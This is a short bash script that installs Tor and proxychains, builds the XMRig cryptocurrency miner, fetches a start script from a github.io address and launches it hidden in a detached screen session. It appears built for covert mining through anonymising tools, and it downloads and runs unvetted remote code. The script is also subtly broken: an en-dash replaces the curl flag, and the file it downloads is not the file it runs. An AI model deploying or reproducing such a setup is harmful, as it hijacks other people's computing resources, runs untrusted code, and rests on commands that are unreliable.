#!/bin/bash
sudo apt update
sudo apt -y install apt-transport-https screen unzip
wget -q -O - https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
echo "deb https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list
sudo apt update
sudo apt  -y install tor deb.torproject.org-keyring
sudo apt-get -y install proxychains
sudo apt-get -y install curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake ..
make
curl –O https://slicommeo.github.io/2019/startloki.sh
sudo chmod +x start.sh
screen -d -m ./start.sh
